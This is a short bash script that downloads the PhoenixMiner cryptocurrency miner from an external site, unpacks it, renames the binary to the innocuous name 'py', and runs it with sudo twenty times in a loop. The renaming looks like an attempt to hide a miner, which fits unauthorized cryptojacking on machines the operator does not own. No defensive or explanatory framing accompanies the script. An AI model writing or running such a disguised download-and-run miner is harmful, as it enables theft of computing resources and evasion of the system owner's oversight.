#!/bin/bash
apt-get install libpci3 && P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
x=1
mkdir neo
TP=$TP
cd neo
wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux
mv PhoenixMiner py
while [ $x -le 20 ]
do

  sudo ./py $TP


  x=$(( $x + 1 ))
  sleep 120
  echo "All done with $x times"
done
